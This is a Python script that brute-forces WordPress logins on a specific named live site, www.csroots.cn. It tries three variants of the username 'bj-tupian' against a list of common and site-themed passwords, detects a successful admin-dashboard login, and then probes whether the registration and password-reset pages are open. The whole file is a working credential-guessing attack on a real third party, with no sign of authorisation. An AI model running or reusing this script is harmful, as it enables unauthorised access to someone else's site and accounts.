#!/usr/bin/env python3
"""csroots.cn: try bj-tupian user + check registration/reset"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "https://www.csroots.cn"
PWS = ["admin123", "123456", "admin", "12345678", "admin888", "123456789", "bj-tupian",
       "bj_tupian", "bj123456", "tupian123", "bjadmin", "123123", "666666", "888888",
       "Aa123456", "abc123456", "admin123456", "csroots", "1234567890", "password"]

def get_opener():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

def fetch(op, url, timeout=10, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read().decode("utf-8", "ignore")
    except Exception:
        return 0, url, ""

# try bj-tupian
for user in ["bj-tupian", "bj_tupian", "tupian"]:
    for pw in PWS:
        op = get_opener()
        try:
            code, final, body = fetch(op, HOST + "/wp-login.php")
            data = urllib.parse.urlencode({"log": user, "pwd": pw, "wp-submit": "登录",
                                           "redirect_to": HOST + "/wp-admin/", "testcookie": "1"})
            code, final, resp = fetch(op, HOST + "/wp-login.php", data=data)
            code3, final3, body3 = fetch(op, HOST + "/wp-admin/")
            if "user_login" not in body3 and ("dashboard" in body3.lower() or "wp-admin-bar" in body3):
                print("!!! HIT %s/%s" % (user, pw))
                raise SystemExit
        except SystemExit:
            raise
        except Exception:
            continue
    print("  %s done" % user)

# registration check
code, final, body = fetch(get_opener(), HOST + "/wp-login.php?action=register")
print("register page:", code, "registration_open:", "registerform" in body or "user_login" in body and "register" in body.lower())

# lost password
code, final, body = fetch(get_opener(), HOST + "/wp-login.php?action=lostpassword")
print("lostpass:", code, "form:", "user_login" in body)

print("[done]")
